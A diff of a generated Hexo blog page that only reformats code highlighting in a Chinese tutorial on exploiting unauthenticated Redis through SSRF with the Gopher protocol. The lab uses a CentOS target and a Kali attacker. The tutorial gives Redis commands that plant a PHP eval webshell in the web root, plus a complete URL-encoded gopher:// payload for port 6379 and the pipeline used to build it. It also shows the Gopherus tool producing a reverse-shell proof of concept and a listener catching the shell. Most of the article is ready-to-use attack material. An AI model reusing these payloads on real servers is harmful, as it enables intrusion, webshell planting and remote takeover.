@@ -30,7 +30,7 @@
     <script src="/libs/jquery/jquery.min.js"></script>
 
 <meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
 
 
 <body>
@@ -513,48 +513,67 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="0×00概述"><a href="#0×00概述" class="headerlink" title="0×00概述"></a>0×00概述</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。</span><br><span class="line"></span><br><span class="line">gopher：gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议（俗称万能协议）</span><br><span class="line"></span><br><span class="line">Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。在ssrf时常常会用到gopher协议构造post包来攻击内网应用。其实构造方法很简单，与http协议很类似。</span><br><span class="line"></span><br><span class="line">不同的点在于gopher协议没有默认端口，所以需要指定web端口，而且需要指定post方法。回车换行使用%<span class="number">0</span>d%<span class="number">0</span>a。</span><br><span class="line"></span><br><span class="line">注意post参数之间的&amp;分隔符也要进行url编码</span><br><span class="line"></span><br><span class="line">基本协议格式：URL:gopher:<span class="comment">//&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span></span><br></pre></td></tr></table></figure>
+                <h2 id="0×00概述"><a href="#0×00概述" class="headerlink" title="0×00概述"></a>0×00概述</h2><pre class=" language-php"><code class="language-php">Gopher 协议可以做很多事情，特别是在 <span class="token constant">SSRF</span> 中可以发挥很多重要的作用。利用此协议可以攻击内网的 <span class="token constant">FTP</span>、Telnet、Redis、Memcache，也可以进行 <span class="token constant">GET</span>、<span class="token constant">POST</span> 请求。这无疑极大拓宽了 <span class="token constant">SSRF</span> 的攻击面。
 
+gopher：gopher协议支持发出<span class="token constant">GET</span>、<span class="token constant">POST</span>请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议（俗称万能协议）
+
+Gopher 协议是 <span class="token constant">HTTP</span> 协议出现之前，在 Internet 上常见且常用的一个协议。在ssrf时常常会用到gopher协议构造post包来攻击内网应用。其实构造方法很简单，与http协议很类似。
+
+不同的点在于gopher协议没有默认端口，所以需要指定web端口，而且需要指定post方法。回车换行使用<span class="token operator">%</span>0d<span class="token operator">%</span>0a。
+
+注意post参数之间的<span class="token operator">&amp;</span>分隔符也要进行url编码
+
+基本协议格式：<span class="token constant">URL</span><span class="token punctuation">:</span>gopher<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host</span><span class="token punctuation">></span></span></span><span class="token punctuation">:</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>port</span><span class="token punctuation">></span></span></span><span class="token operator">/</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>gopher-path</span><span class="token punctuation">></span></span></span>_后接<span class="token constant">TCP</span>数据流</code></pre>
 <h2 id="0×01-环境搭建"><a href="#0×01-环境搭建" class="headerlink" title="0×01 环境搭建"></a>0×01 环境搭建</h2><p>Centos 靶机</p>
 <p>Kali攻击机</p>
 <p>Redis[文中会介绍安装]Gopherus.py [<a href="https://github.com/tarunkant/Gopherus]" target="_blank" rel="noopener">https://github.com/tarunkant/Gopherus]</a></p>
-<h2 id="0x02正文"><a href="#0x02正文" class="headerlink" title="0x02正文"></a>0x02正文</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">那么我们试试看Gopher协议最经典的攻击方式，很多服务默认都不会在公网开启，一般都是仅仅允许本地访问，例如Redis，Redis因为配置不当会造成未授权访问，攻击者可以读取敏感信息，写入文件（不知道的同学可以去补一下这块的知识）</span><br><span class="line"></span><br><span class="line">因为gopher协议传参方式是TCP数据流，那么我们可以尝试使用tcpdump或者直接使用Wireshark进行捕捉TCP的传输。</span><br><span class="line"></span><br><span class="line">我们现在攻击机上安装一个redis 【安装方法有很多，可以用wget安装，也可以用apt-get install 安装】【可以参考https:&#x2F;&#x2F;www.cnblogs.com&#x2F;langtianya&#x2F;p&#x2F;5187681.html】我因为是Kali直接apt-get install搞定的。安装成功后会出现这个开心页面的页面</span><br></pre></td></tr></table></figure>
+<h2 id="0x02正文"><a href="#0x02正文" class="headerlink" title="0x02正文"></a>0x02正文</h2><pre><code>
 
-<p><img src="https://img-blog.csdnimg.cn/20200330030042852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后我们再开一个窗口，输入redis-cli [进入redis的终端]，然后输出ping 如果返回PONG 那么就是成功了.</span><br></pre></td></tr></table></figure>
+那么我们试试看Gopher协议最经典的攻击方式，很多服务默认都不会在公网开启，一般都是仅仅允许本地访问，例如Redis，Redis因为配置不当会造成未授权访问，攻击者可以读取敏感信息，写入文件（不知道的同学可以去补一下这块的知识）
 
+因为gopher协议传参方式是TCP数据流，那么我们可以尝试使用tcpdump或者直接使用Wireshark进行捕捉TCP的传输。
 
+我们现在攻击机上安装一个redis 【安装方法有很多，可以用wget安装，也可以用apt-get install 安装】【可以参考https://www.cnblogs.com/langtianya/p/5187681.html】我因为是Kali直接apt-get install搞定的。安装成功后会出现这个开心页面的页面</code></pre><p><img src="https://img-blog.csdnimg.cn/20200330030042852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<pre class=" language-php"><code class="language-php">然后我们再开一个窗口，输入redis<span class="token operator">-</span>cli <span class="token punctuation">[</span>进入redis的终端<span class="token punctuation">]</span>，然后输出ping 如果返回<span class="token constant">PONG</span> 那么就是成功了<span class="token punctuation">.</span></code></pre>
 <p><img src="https://img-blog.csdnimg.cn/2020033003010231.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">然后我们再进行一些Redis未授权访问的攻击，其中危害最大的莫过于是直接写入Webshell和利用计划任务执行命令反弹shell，这个命令一般Centos容易复现。我们打开我们的抓包工具。</span><br><span class="line"></span><br><span class="line">我这里用Wireshark吧。我们先让他去抓lo这个网卡。</span><br></pre></td></tr></table></figure>
+<pre class=" language-php"><code class="language-php">然后我们再进行一些Redis未授权访问的攻击，其中危害最大的莫过于是直接写入Webshell和利用计划任务执行命令反弹shell，这个命令一般Centos容易复现。我们打开我们的抓包工具。
 
+我这里用Wireshark吧。我们先让他去抓lo这个网卡。</code></pre>
 <p><img src="https://img-blog.csdnimg.cn/20200330030122696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后去执行Redis的恶意语句。（/home/wwwroot/<span class="keyword">default</span>/这个目录必须和目标主机相同）</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config set dir /home/wwwroot/<span class="keyword">default</span>/</span><br><span class="line">config set dbfilename <span class="string">"shell.php"</span></span><br><span class="line">set gaia <span class="string">"&lt;?php eval($_POST[a]);?&gt;"</span></span><br><span class="line">save</span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
-
+<pre class=" language-php"><code class="language-php">然后去执行Redis的恶意语句。（<span class="token operator">/</span>home<span class="token operator">/</span>wwwroot<span class="token operator">/</span><span class="token keyword">default</span><span class="token operator">/</span>这个目录必须和目标主机相同）</code></pre>
+<pre class=" language-php"><code class="language-php">config set dir <span class="token operator">/</span>home<span class="token operator">/</span>wwwroot<span class="token operator">/</span><span class="token keyword">default</span><span class="token operator">/</span>
+config set dbfilename <span class="token string">"shell.php"</span>
+set gaia <span class="token string">"&lt;?php eval($_POST[a]);?>"</span>
+save
+exit</code></pre>
 <p><img src="https://img-blog.csdnimg.cn/20200330030147169.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/home/wwwroot/<span class="keyword">default</span>是网站的根目录，这个可以根据网页报错找到，</span><br><span class="line">也可以使用file:<span class="comment">///协议去读取敏感文件去获取网站根目录。</span></span><br><span class="line">[如果第一条执行不了，可能是你的攻击机器没有这个目录，创建一下就行]</span><br></pre></td></tr></table></figure>
+<pre class=" language-php"><code class="language-php"><span class="token operator">/</span>home<span class="token operator">/</span>wwwroot<span class="token operator">/</span><span class="token keyword">default</span>是网站的根目录，这个可以根据网页报错找到，
+也可以使用file<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///协议去读取敏感文件去获取网站根目录。</span>
+<span class="token punctuation">[</span>如果第一条执行不了，可能是你的攻击机器没有这个目录，创建一下就行<span class="token punctuation">]</span></code></pre>
+<pre class=" language-php"><code class="language-php">打开Wireshark然后右键追踪流里面，有个<span class="token constant">TCP</span>流，里面感觉有很多数据，
+不要害怕，记得去选中我们发送过去的数据【因为我们Redis有数据回显】
 
-
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">打开Wireshark然后右键追踪流里面，有个TCP流，里面感觉有很多数据，</span><br><span class="line">不要害怕，记得去选中我们发送过去的数据【因为我们Redis有数据回显】</span><br><span class="line"></span><br><span class="line">用wireshark 打开找到发送redis 命令的包然后追踪流，以原始数据保存到a.txt</span><br></pre></td></tr></table></figure>
+用wireshark 打开找到发送redis 命令的包然后追踪流，以原始数据保存到a<span class="token punctuation">.</span>txt</code></pre>
 <p><img src="https://img-blog.csdnimg.cn/20200330030409276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">使用如下命令将原始数据a.txt 的内容进行编码，后使用gopher 协议发送到<span class="number">6379</span> 端口</span><br><span class="line"></span><br><span class="line">cat a.txt|xxd -plain|sed -r <span class="string">'s/(..)/%\1/g'</span>|tr -d <span class="string">'\n'</span></span><br><span class="line"></span><br><span class="line">gopher:<span class="comment">//127.0.0.1:6379/%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%32%32%0d%0a%2f%68%6f%6d%65%2f%77%77%77%72%6f%6f%74%2f%64%65%66%61%75%6c%74%2f%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%39%0d%0a%73%68%65%6c%6c%2e%70%68%70%0d%0a%2a%33%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%34%0d%0a%67%61%69%61%0d%0a%24%32%34%0d%0a%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%61%5d%29%3b%3f%3e%0d%0a%2a%31%0d%0a%24%34%0d%0a%73%61%76%65%0d%0a</span></span><br></pre></td></tr></table></figure>
+<pre class=" language-php"><code class="language-php">使用如下命令将原始数据a<span class="token punctuation">.</span>txt 的内容进行编码，后使用gopher 协议发送到<span class="token number">6379</span> 端口
+
+cat a<span class="token punctuation">.</span>txt<span class="token operator">|</span>xxd <span class="token operator">-</span>plain<span class="token operator">|</span>sed <span class="token operator">-</span>r <span class="token string">'s/(..)/%\1/g'</span><span class="token operator">|</span>tr <span class="token operator">-</span>d <span class="token string">'\n'</span>
+
+gopher<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1:6379/%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%32%32%0d%0a%2f%68%6f%6d%65%2f%77%77%77%72%6f%6f%74%2f%64%65%66%61%75%6c%74%2f%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%39%0d%0a%73%68%65%6c%6c%2e%70%68%70%0d%0a%2a%33%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%34%0d%0a%67%61%69%61%0d%0a%24%32%34%0d%0a%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%61%5d%29%3b%3f%3e%0d%0a%2a%31%0d%0a%24%34%0d%0a%73%61%76%65%0d%0a</span></code></pre>
 <p><img src="https://img-blog.csdnimg.cn/20200330030441774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200330030453795.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200330030502746.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">好不容易拿了一个Webshell,这样子真的是异常的麻烦，</span><br><span class="line">于是乎有前辈写过一个脚本，gopherus.py,在github可以下载。</span><br><span class="line">[这个工具支持多种Gopher协议生成攻击代码]下载好后直接使用</span><br></pre></td></tr></table></figure>
+<pre class=" language-php"><code class="language-php">好不容易拿了一个Webshell<span class="token punctuation">,</span>这样子真的是异常的麻烦，
+于是乎有前辈写过一个脚本，gopherus<span class="token punctuation">.</span>py<span class="token punctuation">,</span>在github可以下载。
+<span class="token punctuation">[</span>这个工具支持多种Gopher协议生成攻击代码<span class="token punctuation">]</span>下载好后直接使用</code></pre>
 <p><img src="https://img-blog.csdnimg.cn/2020033003052053.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我们选中redis模块[python gopherus.py --exploit redis] </span><br><span class="line">  然后很贴心的问我要webshell还是反弹shell，然后让我们写接受反弹shell的Ip</span><br></pre></td></tr></table></figure>
-
+<pre class=" language-php"><code class="language-php">我们选中redis模块<span class="token punctuation">[</span>python gopherus<span class="token punctuation">.</span>py <span class="token operator">--</span>exploit redis<span class="token punctuation">]</span> 
+  然后很贴心的问我要webshell还是反弹shell，然后让我们写接受反弹shell的Ip</code></pre>
 <p><img src="https://img-blog.csdnimg.cn/20200330030529558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">虽然最后出了点小问题，但是他有显示了POC代码，直接复制粘贴就行，</span><br><span class="line">这里监听的是<span class="number">1234</span>端口。那我们监听<span class="number">1234</span>端口吧！</span><br></pre></td></tr></table></figure>
-
+<pre class=" language-php"><code class="language-php">虽然最后出了点小问题，但是他有显示了<span class="token constant">POC</span>代码，直接复制粘贴就行，
+这里监听的是<span class="token number">1234</span>端口。那我们监听<span class="token number">1234</span>端口吧！</code></pre>
 <p><img src="https://img-blog.csdnimg.cn/20200330030539806.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">成功获得反弹Shell，不需要各种抓包、转码多开心。</span><br><span class="line">Gopherus.py还支持几种未授权访问的方法，总的来说还不错。</span><br><span class="line">可以都去试一试，很多非加密访问的未授权访问都可以尝试使用Gopher协议去尝试利用!</span><br></pre></td></tr></table></figure>
-
-
-
-
-
+<pre class=" language-php"><code class="language-php">成功获得反弹Shell，不需要各种抓包、转码多开心。
+Gopherus<span class="token punctuation">.</span>py还支持几种未授权访问的方法，总的来说还不错。
+可以都去试一试，很多非加密访问的未授权访问都可以尝试使用Gopher协议去尝试利用<span class="token operator">!</span></code></pre>
 
             </div>
             <hr/>
@@ -851,7 +870,7 @@
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            0×00概述1234567891011Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极
+                            0×00概述Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击
                         
                     </div>
                     <div class="publish-info">
@@ -1076,7 +1095,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">21.2k</span>&nbsp;字
+                class="white-color">20.6k</span>&nbsp;字
             
             
             
